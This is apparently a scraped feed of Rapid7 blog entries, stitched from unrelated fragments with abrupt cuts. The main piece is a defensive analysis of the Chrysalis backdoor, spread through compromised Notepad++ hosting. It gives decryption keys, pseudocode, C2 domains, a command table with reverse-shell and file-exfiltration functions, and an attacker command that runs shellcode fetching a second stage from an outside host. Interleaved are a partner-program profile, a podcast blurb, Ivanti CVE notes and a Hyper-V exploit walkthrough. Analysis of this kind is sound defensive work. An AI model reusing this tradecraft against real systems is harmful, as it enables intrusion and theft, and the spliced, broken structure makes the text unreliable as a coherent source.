environments.</p><p>It also reinforces a broader trend we’ve seen over the last year: attackers are patient, selective, and focused on long‑term access rather than immediate impact. That has implications for detection strategies, incident response planning, and supply chain risk management.</p>What does this mean for software supply chain security?<p>For defenders, this incident reinforces several lessons:</p><ul><li><p>Supply chain security must include distribution and hosting infrastructure, not just source code.</p></li><li><p>Update mechanisms should enforce strong signature and metadata validation by default.</p></li><li><p>Shared hosting environments represent an often overlooked risk, especially for widely deployed tools.</p></li><li><p>Trust in software must be continuously validated, not assumed.</p></li></ul><p>The Chrysalis incident is not just about a single tool or a single campaign. It reflects a broader shift in how advanced threat actors think about access, persistence, and trust. Software supply chains are no longer just a development concern. They are an operational and security concern that extends into hosting providers, update mechanisms, and the assumptions organizations make about what is “safe.”</p><p>As attackers continue to favor selective targeting and long‑term access over noisy, large‑scale compromise, defenders need to adapt accordingly. That means moving beyond basic scanning, validating trust continuously, and treating update and distribution infrastructure as part of the attack surface.</p>Learn more: Watch the full Chrysalis debrief webinar<p>If you’d like to hear directly from the researchers behind this discovery, watch the full <a href=\"https://www.brighttalk.com/webcast/10457/661975?utm_source=blog&amp;utm_medium=webcast&amp;utm_content=blog-2-chrysalis-registration&amp;utm_campaign=global-mdr-2026-q1-webinar-prospect-eng\" target=\"_blank\">Chrysalis: Inside the Supply Chain Compromise of Notepad++ webinar</a>, now available on BrightTALK.

    "summary": "<p>In 2026, security teams are still grappling with the challenges posed by expanding attack surfaces and persistent resource constraints. Together with the rapid onset of AI-driven threats, security leaders are weathering this ‘perfect storm’ by seeking consolidation of their technology stacks – favoring trusted partnerships that truly understand their unique ecosystems.</p><p>To elevate security partners from mere service providers to essential, trusted security advisors, it is vital to help customers achieve a comprehensive view of their IT environments. This includes a clear understanding of their risk profiles and a cohesive approach to continuous detection, response, and compliance, says Kelly Hiscoe, Sr. Director, Global Partner Programs &amp; Experience.</p><p>Kelly brings to Rapid7 more than 17 years of experience in cybersecurity channel ecosystems. And after being named to CRN’s <em>Women of the Channel</em> list in 2020, 2024, and 2025, <strong>CRN</strong> <strong>has</strong> <strong>honored her as a </strong><a href=\"https://www.crn.com/channel-chiefs/cc2026-details?c=218\"><strong>Channel Chief for 2026</strong></a>.</p><p>She has consistently led her teams to design competitive programs, drive operational excellence, and enhance the partner experience from the ground-up. Here’s what makes her tick, and how Kelly (and Rapid7) are thinking about the channel in 2026 and beyond.</p>A channel philosophy rooted in shared responsibility<p>Kelly’s approach to the channel is grounded in the simple belief that true success is built through shared ownership. Rather than being confined to a single team, channel success <em>must</em> be woven into a company’s DNA: reflected in its processes, tools, and most importantly, how sales teams consistently engage with partners. </p><p>For Kelly, this means a company-wide commitment to engaging and collaborating with partners, in a way that, at its heart, exists to help customers achieve their goals. That’s what “Channel-first” means, and what Rapid7 aims to reflect.</p>Refreshing Rapid7’s partner ecosystem<p>In February 2025, Rapid7 launched its reimagined <strong>PACT Partner Program</strong>, and Kelly led the global team responsible for that launch. The revamped program was designed to equip partners with the tools, training, and resources needed to address evolving global security challenges together. </p><p>Key enhancements included a modernized Partner Portal that enables real-time collaboration and automation, as well as tailored engagement programs and specializations, plus the launch of the Rapid7 Partner Academy. Since its debut, the Academy has seen more than 2,000 partner learners earn over 3,700 certifications. Rapid7’s partners consistently highlight its clarity, relevance, and impact in deepening cybersecurity expertise.</p>Looking ahead: Helping partners navigate 2026<p>As consolidation continues and competition in the market grows, partners are facing more challenges than ever in navigating that complexity and standing out amid the noise.

In this episode, Sabeen Malik unpacks what it takes to bridge that gap. She talks through disclosure laws, geopolitical tension, and the difficulty of turning policy into something operators can act on. Sabeen brings both policy expertise and operational realism, making the case that cybersecurity regulation needs to be built for the real world, not for a checklist. She also explores the cultural side of risk, including how insider threats and trust-based frameworks play into resilience planning. If your organization is tracking regulatory changes or working toward a more mature security posture, this episode offers a smart lens on where policy can help, and how to overcome it's shortfalls.</p><p>[<a href=\"https://www.rapid7.com/blog/post/it-policy-to-practice-cyber-resilience-needs-reboot-experts/\">Read and watch</a>]</p>",

    "link": "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit",
    "summary": "<p>Rapid7 Labs, together with the Rapid7 MDR team, has uncovered a sophisticated campaign attributed to the Chinese APT group Lotus Blossom. Active since 2009, the group is known for its targeted espionage campaigns primarily impacting organizations across Southeast Asia and more recently Central America, focusing on government, telecom, aviation, critical infrastructure, and media sectors.</p><p>Our investigation identified a security incident stemming from a sophisticated compromise of the infrastructure hosting Notepad++, which was subsequently used to deliver a previously undocumented custom backdoor, which we have dubbed Chrysalis.</p><p>⠀</p>Figure 1: Telemetry on the custom backdoor samples<p>⠀</p><p>Beyond the discovery of the new implant, forensic evidence led us to uncover several custom loaders in the wild. One sample, <em>“ConsoleApplication2.exe”</em>, stands out for its use of Microsoft Warbird, a complex code protection framework, to hide shellcode execution. This blog provides a deep technical analysis of Chrysalis, the Warbird loader, and the broader tactic of mixing straightforward loaders with obscure, undocumented system calls.</p>Initial access vector: Notepad++ and update.exe<p>Forensic analysis conducted by the MDR team suggests that the initial access vector aligns with publicly disclosed abuse of the Notepad++ distribution infrastructure. While <a href=\"https://notepad-plus-plus.org/news/hijacked-incident-info-update/\">reporting</a> references both plugin replacement and updater-related mechanisms, no definitive artifacts were identified to confirm exploitation of either. The only confirmed behavior is that execution of <em>“notepad++.exe”</em> and subsequently <em>“GUP.exe”</em> preceded the execution of a suspicious process <em>“update.exe”</em> which was downloaded from 95.179.213.0.</p>Analysis of update.exeFigure 2: Execution diagram of update.exe<p>⠀</p><p>Analysis of<em> “update.exe”</em> shows the file is actually an NSIS installer, a tool commonly used by <a href=\"https://www.rapid7.com/blog/post/2025/05/22/nsis-abuse-and-srdi-shellcode-anatomy-of-the-winos-4-0-campaign/\">Chinese APT</a> to deliver initial payload.</p><p>The following are the extracted NSIS installer files:</p>[NSIS].nsi<ul><li><strong>Description:</strong> NSIS Installation script</li><li><strong>SHA-256: </strong>8ea8b83645fba6e23d48075a0d3fc73ad2ba515b4536710cda4f1f232718f53e</li></ul>BluetoothService.exe<ul><li><p><strong>Description:</strong> renamed Bitdefender Submission Wizard used for DLL sideloading</p></li><li><strong>SHA-256: </strong>2da00de67720f5f13b17e9d985fe70f10f153da60c9ab1086fe58f069a156924</li></ul>BluetoothService<ul><li><strong>Description: </strong>Encrypted shellcode</li><li><strong>SHA-256: </strong>77bfea78def679aa1117f569a35e8fd1542df21f7e00e27f192c907e61d63a2e</li></ul>log.dll<ul><li><strong>Description: </strong>Malicious DLL sideloaded by BluetoothService.exe</li><li><strong>SHA-256: </strong>3bdc4c0637591533f1d4198a72a33426c01f69bd2e15ceee547866f65e26b7ad</li></ul><p>⠀</p><p>Installation script is instructed to create a new directory <em>“Bluetooth”</em><strong> </strong>in <em>“%AppData%”</em><strong> </strong>folder, copy the remaining files there, change the attribute of the directory to <strong>HIDDEN</strong><strong> </strong>and execute <em>BluetoothService.exe</em><em>.</em></p>DLL sideloading<p>Shortly after the execution of <em>BluetoothService.exe</em>,<em> </em>which is actually a renamed legitimate <em>Bitdefender Submission Wizard</em> abused for <strong>DLL sideloading</strong>, a malicious <em>log.dll</em> was placed alongside the executable, causing it to be loaded instead of the legitimate library. Two exported functions from <em>log.dll</em> are called by <em>Bitdefender Submission Wizard</em>: <strong>LogInit</strong><strong> </strong>and <strong>LogWrite</strong>.</p>LogInit and LogWrite - Shellcode load, decrypt, execute<p><strong>LogInit</strong> loads <em>BluetoothService</em><em> </em>into the memory of the running process.</p><p><strong>LogWrite</strong><strong> </strong>has a more sophisticated goal – to decrypt and execute the shellcode.</p><p>The decryption routine implements a custom runtime decryption mechanism used to unpack encrypted data in memory. It derives key material from previously calculated hash value and applies a stream‑cipher–like algorithm rather than standard cryptographic APIs. At a high level, the decryption routine relies on a linear congruential generator, with the standard constants <strong>0x19660D</strong> and <strong>0x3C6EF35F</strong>, combined with several basic data transformation steps to recover the plaintext payload.</p><p>Once decrypted, the payload replaces the original buffer and all temporary memory is released. Execution is then transferred to this newly decrypted stage, which is treated as executable code and invoked with a predefined set of arguments, including runtime context and resolved API information.</p>Figure 3: LogWrite internalsIAT resolution<p><strong>Log.dll</strong><strong> </strong>implements an API hashing subroutine to resolve required APIs during execution, reducing the likelihood of detection by antivirus and other security solutions.</p>API hashing subroutine<p>The hashing algorithm will hash export names using <strong>FNV‑1a</strong><strong> </strong>(fnv-1a hash 0x811C9DC5, fnv-1a prime 0x1000193 observed), then apply a <strong>MurmurHash‑style avalanche finalizer</strong><strong> </strong>(murmur constant 0x85EBCA6B observed), and compare the result to a salted target hash.</p>Analysis of the Chrysalis backdoor<p>The shellcode, once decrypted by <em>log.dll</em><em>,</em> is a custom, feature-rich backdoor we've named “<em>Chrysalis</em>”. Its wide array of capabilities indicates it is a sophisticated and permanent tool, not a simple throwaway utility. It uses legitimate binaries to sideload a crafted DLL with a generic name, which makes simple filename-based detection unreliable. It relies on custom API hashing in both the loader and the main module, each with its own resolution logic. This is paired with layered obfuscation and a fairly structured approach to C2 communication. Overall, the sample looks like something that has been actively developed over time, and we’ll be keeping an eye on this family and any future variants that show up.</p>Decryption of the main module<p>Once the execution is passed to decrypted shellcode from <em>log.dll</em><em>,</em> malware starts with decryption of the main module via a simple combination of XOR, addition and subtraction operations, with a hardcoded key <strong>gQ2JR&amp;9;</strong>. See below the pseudocode of decryption routine:</p><p>⠀</p><pre>char XORKey[8] = \"gQ2JR&amp;9;\";\nDWORD counter = 0;\nDWORD pos = BufferPosition;\n\nwhile (counter &lt; size) {\n    BYTE k = XORKey[counter &amp; 7];\n    BYTE x = encrypted[pos];\n\n    x = x + k;\n    x = x ^ k;\n    x = x - k;\n\n    decrypted[pos] = x;\n\n    pos++;\n    counter++;\n}</pre><p>⠀</p><p>XOR operation is performed 5 times in total, suggesting a section layout similar to PE format. Following the decryption, malware will proceed to yet another dynamic IAT resolution using <strong>LoadLibraryA</strong><strong> </strong>to acquire a handle to <strong>Kernel32.dll</strong> and <strong>GetProcAddress</strong>. Once exports are resolved, the jump is taken to the main module.</p>Main module<p>The decrypted module is a reflective <strong>PE-like</strong> module that executes the <strong>MSVC CRT</strong><strong> </strong>initialization sequence before transferring control to the program’s main entry point. Once in the Main function, the malware will dynamically load DLLs in the following order: <strong>oleaut32.dll</strong>, <strong>advapi32.dll</strong>, <strong>shlwapi.dll</strong>, <strong>user32.dll</strong>, <strong>wininet.dll</strong>,<strong> </strong><strong>ole32.dll</strong> and <strong>shell32.dll</strong>.</p><p>Names of targeted DLLs are constructed on the run, using two separate subroutines. These two subroutines implement a custom, position-dependent character obfuscation scheme. Each character is transformed using a combination of bit rotations, conditional XOR operations, and index-based arithmetic, ensuring that identical characters encrypt differently depending on their position. The second routine reverses this process at runtime, reconstructing the original plaintext string just before it is used. The purpose of these two functions is not only to conceal strings, but also to intentionally complicate static analysis and hinder signature-based detection.</p><p>After the DLL name is reconstructed, the Main module implements another, more sophisticated API hashing routine.</p>API hashing subroutineFigure 4: API hashing diagram<p>⠀</p><p>The first difference between this and the API hashing routine used by the loader is that this subroutine accepts only a single argument: the hash of the target API. To obtain the DLL handle, the malware walks the PEB to reach the <strong>InMemoryOrderModuleList</strong>, then parses each module’s export table, skipping the main executable, until it resolves the desired API. Instead of relying on common hashing algorithms, the routine employs multi-stage arithmetic mixing with constants of <strong>MurmurHash-style finalization</strong>. API names are processed in 4-byte blocks using multiple rotation and multiplication steps, followed by a final diffusion phase before comparison with the supplied hash. This design significantly complicates static recovery of resolved APIs and reduces the effectiveness of traditional signature-based detection. As a fallback, the resolver supports direct resolution via <strong>GetProcAddress</strong> if the target hash is not found through the hashing method. The pointer to <strong>GetProcAddress</strong> is obtained earlier during the “main module preparation” stage.</p><p>⠀</p>Figure 5: API hashing internalsConfig decryption<p>The next step in the malware’s execution is to decrypt the configuration. Encrypted configuration is stored in the <em>BluetoothService</em> file at offset 0x30808 with the size of 0x980. Algorithm for the decryption is <strong>RC4</strong><strong> </strong>with the key <strong>qwhvb^435h&amp;*7</strong>. This revealed the following information:</p><ul><li><strong>Command and Control (C2) url</strong>: <strong>https://api.skycloudcenter.com/a/chat/s/70521ddf-a2ef-4adf-9cf0-6d8e24aaa821</strong></li><li><strong>Name of the module</strong>: <strong>BluetoothService</strong></li><li><strong>User agent</strong>: <strong>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4044.92 Safari/537.36</strong></li></ul><p>The URL structure of the C2 is interesting, especially the section /a/chat/s/{GUID}), which appears to be the identical format used by Deepseek API chat endpoints. It looks like the actor is mimicking the traffic to stay below the radar. </p><p>Decrypted configuration doesn’t give much useful information besides the C2. The name of the module is too generic and the user agent belongs to Google Chrome browser. The URL resolves to <strong>61.4.102.97</strong>, IP address based in<strong> </strong><strong>Malaysia</strong>. At the time of the writing of this blog, no other file has been seen to communicate with this IP and URL.</p>Persistence and command-line arguments<p>To determine the next course of action, malware checks command-line arguments highlighted in Table 1 and chooses one of four potential paths. If the amount of the command-line arguments is greater than two, the process will exit. If there is no additional argument, persistence is set up primarily via service creation or registry as a fall back mechanism.</p><p>See Table 2 below:</p><p><strong>Argument</strong></p><p><strong>Mode</strong></p><p><strong>Action</strong></p><p><strong>(None)</strong></p><p>Installation</p><p>Installs persistence (Service or Registry) pointing to binary with -i flag, then terminates.</p><p><strong>-i</strong></p><p>Launcher</p><p>Spawns a new instance of itself with the -k flag via ShellExecuteA, then terminates.</p><p><strong>-k</strong></p><p>Payload</p><p>Skips installation checks and executes the main malicious logic (C2 &amp; Shellcode).</p><p>⠀</p><p>With the expected arguments present, the malware proceeds to its primary functionality - to gather information about the infected asset and initiate the communication with C2.</p>Information gathering and C2 communication<p>A mutex <strong>Global\\\\Jdhfv_1.0.1 </strong>is registered to enforce single instance execution on the host. If it already exists, malware is terminated. If the check is clear, information gathering begins by querying for the following: current time, installed AVs, OS version, user name and computer name. Next, computer name, user name, OS version and string <strong>1.01</strong><strong> </strong>are concatenated and the data are hashed using <strong>FNV-1A</strong>. This value is later turned into its decimal ascii representation and used most likely as a unique identifier of the infected host. </p><p>Final buffer uses a dot as delimiter and follows this pattern: </p><p>⠀</p><pre>&lt;UniqueID&gt;.&lt;ComputerName&gt;.&lt;UserName&gt;.&lt;OSVersion&gt;.&lt;127.0.0.1&gt;.&lt;AVs&gt;.&lt;DateAndTime&gt;</pre><p>⠀</p><p>The last piece of information added to the beginning of the buffer is a string <strong>4Q</strong>. The buffer is then <strong>RC4</strong> encrypted with the key <strong>vAuig34%^325hGV</strong>.</p><p>Following data encryption, the malware establishes an internet connection using previously mentioned user agent and C2 <strong>api.skycloudcenter.com </strong>over port <strong>443</strong>. Data is then transferred via <strong>HttpSendRequestA</strong><strong> </strong>using the <strong>POST</strong><strong> </strong>method. Response from the server is then read to a temporary buffer which is later decrypted using the same key <strong>vAuig34%^325hGV</strong>.</p>Response and command processing<p><em><strong>Note:</strong></em> C2 server was already offline during the initial analysis, preventing recovery of any network data. As a result, and due to the complexity of the malware, parts of the following analysis may contain minor inaccuracies.</p><p>The response from the C2 undergoes multiple checks before further processing. First, the HTTP response code is compared against the hardcoded value <strong>200</strong><strong> </strong>(0xC8),<strong> </strong>indicating a successful request, followed by a validation of the associated WinInet handle to ensure no error occurred. The malware then verifies the integrity of the received payload and execution proceeds only if at least one valid structure is detected. Next, malware looks into the response data for a small tag to determine what to do next. Tag is used as a condition for a switch statement with 16 possible cases. The default case will simply set up a flag to <strong>TRUE</strong>. Setting up this flag will result in completely jumping out of the switch. Other switch cases includes following options:</p><p>⠀</p><p><strong>Char representation</strong></p><p><strong>Hex representation</strong></p><p><strong>Purpose</strong></p><p><strong>4T</strong></p><p><strong>0x3454</strong></p><p>Spawn interactive shell</p><p><strong>4U</strong></p><p><strong>0x3455</strong></p><p>Send ‘OK’ to C2</p><p><strong>4V</strong></p><p><strong>0x3456</strong></p><p>Create process</p><p><strong>4W</strong></p><p><strong>0x3457</strong></p><p>Write file to disk</p><p><strong>4X</strong></p><p><strong>0x3458</strong></p><p>Write chunk to open file</p><p><strong>4Y</strong></p><p><strong>0x3459</strong></p><p>Read &amp; send data</p><p><strong>4Z</strong></p><p><strong>0x345A</strong></p><p>Break from switch</p><p><strong>4\\\\</strong></p><p><strong>0x345C</strong></p><p>Uninstall / Clean up</p><p><strong>4]</strong></p><p><strong>0x345D</strong></p><p>Sleep</p><p><strong>4_</strong></p><p><strong>0x345F</strong></p><p>Get info about logical drives</p><p><strong>4`</strong></p><p><strong>0x3460</strong></p><p>Enumerate files information</p><p><strong>4a</strong></p><p><strong>0x3661</strong></p><p>Delete file </p><p><strong>4b</strong></p><p><strong>0x3662</strong></p><p>Create directory</p><p><strong>4c</strong></p><p><strong>0x3463</strong></p><p>Get file from C2</p><p><strong>4d</strong></p><p><strong>0x3464</strong></p><p>Send file to C2</p><p>⠀</p><p><strong>4T</strong> - The malware implements a fully interactive <strong>cmd.exe reverse shell</strong> using redirected pipes. Incoming commands from the C2 are converted from <strong>UTF‑8</strong> to the system <strong>OEM</strong> code page before being written to the shell’s standard input, while a dedicated thread continuously reads shell output, converts it from OEM encoding to UTF‑8 using <strong>GetOEMCP</strong> API, and forwards the result back to the C2.</p><p><strong>4V</strong><strong> </strong>- This option allows remote process execution by invoking <strong>CreateProcessW</strong> on a C2-supplied command line and relaying execution status back to the C2.</p><p><strong>4W</strong><strong> </strong>- This option implements a remote file write capability, parsing a structured response containing a destination path and file contents, converting encodings as necessary, <strong>writing the data to disk</strong>, and <strong>returning a formatted status message</strong> to the command-and-control server.</p><p><strong>4X</strong><strong> </strong>- Similar to the previous switch, it supports a remote file-write capability, allowing the C2 to drop arbitrary files on the victim system by supplying a <strong>UTF-8 filename and associated data blob</strong>.</p><p><strong>4Y</strong> - Switch implements a remote file-read capability. It opens a specified file with, retrieves its size, reads the entire contents into memory, and <strong>transmits the data back to the C2</strong>. </p><p><strong>4\\\\</strong><strong> </strong>- The option implements a full <strong>self-removal mechanism</strong>. It deletes auxiliary payload files, removes persistence artifacts from both the <strong>Windows Service registry hive</strong> and <strong>the Run key</strong>, generates and executes a temporary batch file <strong>u.bat</strong><strong> </strong>to delete the running executable after termination, and finally removes the batch script itself. </p><p><strong>4_</strong><strong> </strong>- Here malware enumerates information about logical drivers using <strong>GetLogicalDriveStringsA</strong> and <strong>GetDriveTypeA</strong><strong> </strong>APIs and sends the information back to the C2.</p><p><strong>4`</strong><strong> </strong>- This switch option shares similarities with previously analyzed data exfiltration function - <strong>4Y</strong>. However, its primary purpose differs. Instead of transmitting preexisting data, it <strong>enumerates files</strong> within a specified directory, <strong>collects per-file metadata</strong> (timestamps, size, and filename), serializes the results into a custom buffer format, and sends the aggregated listing to the C2.</p><p><strong>4a - 4b - 4c - 4d</strong><strong> </strong>- In the last 4 cases, malware implements a custom file transfer protocol over its C2 channel. Commands <strong>4a</strong> and <strong>4b</strong> act as control messages used to initialize file <strong>download</strong><strong> </strong>and <strong>upload operations</strong> respectively, including file paths, offsets, and size validation. Once initialized, the actual data transfer occurs in a chunked fashion using commands <strong>4c (download)</strong><strong> </strong>and <strong>4d (upload)</strong><strong>.</strong> Each chunk is wrapped in a fixed-size 40-byte response structure, validated for successful HTTP status and correct structure count before processing. Transfers continue until the C2 signals completion via a non-zero termination flag, at which point file handles and buffers are released.</p>Additional artifacts discovered on the infected host<p>During the initial forensics analysis of the affected asset, Rapid7’s MDR team observed execution of following command:</p><p>⠀</p><pre>C:\\ProgramData\\USOShared\\svchost.exe-nostdlib -run\nC:\\ProgramData\\USOShared\\conf.c</pre><p>⠀</p><p>The retrieved folder <em>“USOShared”</em><strong> </strong>from the infected asset didn’t contain svchost.exe but it contained <em>“libtcc.dll” </em>and <em>“conf.c”</em>.

To confirm this, we replicated the steps of the attacker successfully loaded <strong>shellcode</strong> from <em>“conf.c” </em>into the memory of <em>“tcc.exe”</em>, confirming our previous hypothesis.<strong> </strong></p><strong>Analysis of conf.c</strong><p>The C source file contains a fixed size (836) char buffer containing shellcode bytes which is later casted to a function pointer and invoked. The shellcode is consistent with 32-bit version of <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm\">Metasploit’s block API.</a></p><p>The shellcode loads <strong>Wininet.dll</strong> using <strong>LoadLibraryA</strong>, resolves Internet-related APIs such as <strong>InternetConnectA</strong><strong> </strong>and <strong>HttpSendRequestA</strong>, and downloads a file from <strong>api.wiresguard.com/users/admin</strong>. The file is read into a newly allocated buffer, and execution is then transferred to the start of the 2000-byte second-stage shellcode. </p><p>⠀</p>Figure 6: Shellcode decryption stub<p>⠀</p><p>This stub is responsible for decrypting the next payload layer and transferring execution to it.

All the previous samples used a pretty common technique to execute the shellcode - decrypt embedded shellcode in user space, change the protection of memory region to executable state, and invoke decrypted code via <strong>CreateThread</strong><strong> </strong>/ <strong>CreateRemoteThread</strong>; Loader 3 (original name <em>“ConsoleApplication2.exe”</em>) violates this approach. </p>Analysis of Loader 3 - ConsoleApplication2.exe <p>At the first glance, the logic of the sample is straightforward: Load the DLL <strong>clipc.dll</strong>, overwrite first 0x490 bytes, change the protection to <strong>PAGE_EXECUTE_READ</strong> (0x20), and then invoke <strong>NtQuerySystemInformation</strong><strong>. </strong>Two interesting notes to highlight here - bytes copied into the memory region of clipc.dll are not valid shellcode and <strong>NtquerySystemInformation</strong> is used to “<a href=\"https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation\">Retrieve the specified system information</a>”, not to execute code.</p><p>⠀</p>Figure 10: Snippet from ConsoleApplication2.exe<p>⠀</p><p>Looking into the copied data reveals two “magic numbers” <strong>DEADBEEF</strong><strong> </strong>and <strong>CAFEAFE</strong>, but nothing else. However, the execution of shellcode is somehow successful, so what’s going on?</p><p>⠀</p>Figure 11: Data copied into clipc.dll<p>⠀</p><p>According to the official documentation, the first parameter of NtQuerySystemInformation is of type <strong>SYSTEM_INFORMATION_CLASS</strong><strong> </strong>which specifies the category of system information to be queried. During static analysis in <strong>IDA Pro</strong>, this parameter was initially identified as <strong>SystemExtendedProcessInformation|0x80</strong><strong> </strong>but looking for this value in MSDN and other public references didn’t provide any explanation on how the execution was achieved. But, searching for the original value passed to the function <strong>(0xB9)</strong><strong> </strong>uncovered something interesting. The following <a href=\"https://downwithup.github.io/blog/post/2023/04/23/post9.html\">blog</a> by DownWithUp covers Microsoft Warbird, which could be described as an internal <a href=\"https://cirosec.de/en/news/abusing-microsoft-warbird-for-shellcode-execution/\">code protection and obfuscation framework</a><strong>. </strong>These resources confirm IDA misinterpretation of the argument which should be <strong>SystemCodeFlowTransition</strong>, a necessary argument to invoke Warbird functionality. Additionally, DownWithUp’s blog post mentioned the possible operations:</p><p>⠀</p>Figure 12: Warbird operations documented by DownWithUp<p>⠀</p><p>Referring to the snippet we saw from <em>“ConsoleApplication2.exe”</em>, the operation is equal to <strong>WbHeapExecuteCall</strong><strong> </strong>which gives us the answer on how the shellcode gained execution. Thanks to work of other researchers, we also know that this technique only works if the code resides inside of memory of Microsoft signed binary, thus revealing why <strong>clipc.dll</strong><strong> </strong>has been used.<strong> </strong>The blog post from <strong>cirosec</strong><strong> </strong>also contains a link for their <a href=\"https://github.com/cirosec/warbird-demos/blob/main/Loader/Loader.cpp\">POC</a> of this technique which is almost the same replica of <em>“ConsoleApplication2.exe”</em>, hinting that author of <em>“ConsoleApplication2.exe”</em> simply copied it and modified to execute <strong>Metasploit block_api</strong> shellcode instead of the benign calc from POC. The comparison of the Cobalt Strike beacon configuration delivered via <em><strong>“</strong></em><em>conf.c</em><em><strong>”</strong></em><em> </em>and <em>“ConsoleApplication2.exe”</em> revealed shared trades between these two, most notably <strong>domain</strong>, <strong>public key</strong><strong>,</strong> and <strong>process injection technique</strong>.</p>Attribution to Lotus Blossom<p>Attribution is primarily based on strong similarities between the initial loader observed in this intrusion and previously published <a href=\"https://sed-cms.broadcom.com/system/files/threat-hunter-whitepaper/2025-04/2025_04_ChinaLinked_Espionage_Actors.pdf\">Symantec</a> research. Particularly the use of a renamed <em>“Bitdefender Submission Wizard”</em> to side-load <em>“log.dll”</em> for decrypting and executing an additional payload.<br>In addition, similarities of the execution chain of <em>“conf.c”</em> retrieved from the infected asset and other loaders that we found, supported by the same <strong>public key</strong> extracted from CS beacons delivered through <em>“conf.c”</em> and <em>“ConsoleApplication2.exe”</em> suggests with moderate confidence, that the threat actor behind this campaign is likely Lotus Blossom.</p>Conclusion<p>The discovery of the Chrysalis backdoor and the Warbird loader highlights an evolution in Lotus Blossom's capabilities. While the group continues to rely on proven techniques like DLL sideloading and service persistence, their multi-layered shellcode loader and integration of undocumented system calls (NtQuerySystemInformation) mark a clear shift toward more resilient and stealth tradecraft.</p><p>What stands out is the mix of tools: the deployment of custom malware (Chrysalis) alongside commodity frameworks like Metasploit and Cobalt Strike, together with the rapid adaptation of public research (specifically the abuse of Microsoft Warbird).

As an indication of how critical this development is, CISA has given a “due date” of only 3 days (Due Feb 1, 2026) for organizations, such as federal agencies, to remediate the vulnerabilities before the affected devices must be removed from a network.</p><p>While <a href=\"https://www.cve.org/CVERecord?id=CVE-2026-1281\">CVE-2026-1281</a> has been confirmed as exploited in the wild as a zero day, it is unclear if <a href=\"https://www.cve.org/CVERecord?id=CVE-2026-1340\">CVE-2026-1340</a> has also, or if this vulnerability was found separately to <a href=\"https://www.cve.org/CVERecord?id=CVE-2026-1281\">CVE-2026-1281</a>.

Based on the vendor's <a href=\"https://forums.ivanti.com/s/article/Analysis-Guidance-Ivanti-Endpoint-Manager-Mobile-EPMM-CVE-2026-1281-CVE-2026-1340?language=en_US\">guidance</a>, the attackers can provide Bash commands as part of a malicious HTTP GET request to the endpoints that service either the “In-House Application Distribution” feature (i.e. /mifs/c/appstore/fob/) or the “Android File Transfer Configuration” feature (i.e. /mifs/c/aftstore/fob/), resulting in arbitrary OS command execution on the target. </p><p>As EPMM is an endpoint management solution for mobile devices, the impact of an attacker compromising the EPMM server is significant. An attacker may be able to access Personally Identifiable Information (PII) regarding mobile device users, such as their names and email addresses, but also their mobile device information, such as their phone numbers, GPS information, and other sensitive unique identification information. This is in addition to the privileged position an attacker will have on the EPMM device itself, which may allow for lateral movement within the compromised network.<br>Given the nature of the product, EPMM is a high-profile target. It has been repeatedly targeted by zero-day vulnerabilities in the past. In 2023 the product was exploited in the wild via <a href=\"https://www.rapid7.com/blog/post/2023/07/26/etr-cve-2023-35078-critical-api-access-vulnerability-ivanti-in-endpoint-manager-mobile/\">CVE-2023-35078</a>, and again in 2025 via an exploit chain of <a href=\"https://www.rapid7.com/blog/post/2025/05/16/etr-ivanti-epmm-exploit-chain-exploited-in-the-wild/\">CVE-2025-4427 and CVE-2025-4428</a>.

    "summary": "Introduction<p>If you received an email with the subject “I LOVE YOU” and an attachment called “LOVE-LETTER-FOR-YOU.TXT”, would you open it? Probably not, but back in the year 2000, plenty of people did exactly that. The internet learned a hard lesson about the disproportionate power available to a university dropout with some VBScript skills, and millions of ordinary people suffered the anguish of deleted family photos or even reputational damage as the worm propagated itself across their entire Outlook address book.</p><p>In the quarter century since ILOVEYOU rampaged across global networks, cybersecurity has moved from a niche topic to an “everyone” problem, and many users are wary of all sorts of threats. In recent years, the increasing ubiquity and urgency of AI adoption across the business landscape has attracted the attention of both security researchers and threat actors.</p><p>Of course, recency bias and shiny object fixation are real. Even as AI and automation continue to drive down time to known exploitation (TTKE), an attacker who abuses a traditional exploit chain to achieve SYSTEM privileges on a sensitive server still has the keys to the kingdom.</p><p>Wormable remote code execution (RCE) vulnerabilities remain rare, but well over half of the 25 exploited-in-the-wild zero-day vulnerabilities published by Microsoft during 2025 provided attackers with elevation of privilege opportunities on Windows assets. Some of those flaws are older than the iPhone, let alone ChatGPT.</p><p>Microsoft's decades-long commitment to backwards compatibility creates a conveyor belt supply of déjà vu vulnerabilities. Ultimately, the most pressing threats faced by defenders managing Microsoft estates remain essentially unchanged. Rather than a new wave of AI-related flaws, the chief danger stems from the towering tech debt within core Windows components.</p>A whirlwind tour of exploited-in-the-wild Microsoft vulnerabilities (2025 edition)<p>If we really want to know which Microsoft vulnerabilities will provide the most value to attackers in 2026, we should ask a threat actor. Since that might prove difficult to arrange, we’ll do the next best thing: review vulnerabilities exploited in the wild during 2025.</p><p>⠀</p>Chart 1: Exploited-in-the-wild Microsoft vulnerabilities, by vulnerable componentJanuary: The great escape<p>The vast Microsoft ecosystem has something for everyone, whether customer or threat actor. <a href=\"https://www.rapid7.com/blog/post/2025/01/14/patch-tuesday-january-2025/\">Patch Tuesday January 2025</a> brought us a trio of exploited-in-the-wild Hyper-V kernel vulnerabilities. By September 2025, at least one plausible public proof-of-concept (PoC) for <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21333\">CVE-2025-21333</a> was published by a vulnerability researcher who apparently shares a name with a Kazakhstani Olympic gymnast. The only safe assumption is that a well-resourced threat actor could develop a private exploit far in advance of that.</p><p>Starting from a child VM or Windows Sandbox, exploitation first requires setting out a banquet of benign requests for the hypervisor, delivered via the Hyper-V Virtualization Service Provider (VSP). The goal: mass-allocating objects to arrange large swathes of hypervisor memory in a predictable pattern (aka “<a href=\"https://blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf\">heap feng shui</a>”). Next, the attacker sends a malicious request with an oversized buffer, which an unpatched VSP merrily copies into kernel memory, overwriting the header of the adjacent object, whose relative position is now easily surmised. Once the kernel subsequently references the artfully corrupted sibling object, execution as SYSTEM jumps to a portion of memory where the attacker has planted shellcode to exfiltrate a token. The compromised hypervisor could be anything from a developer laptop running a malicious container all the way up to enterprise private cloud 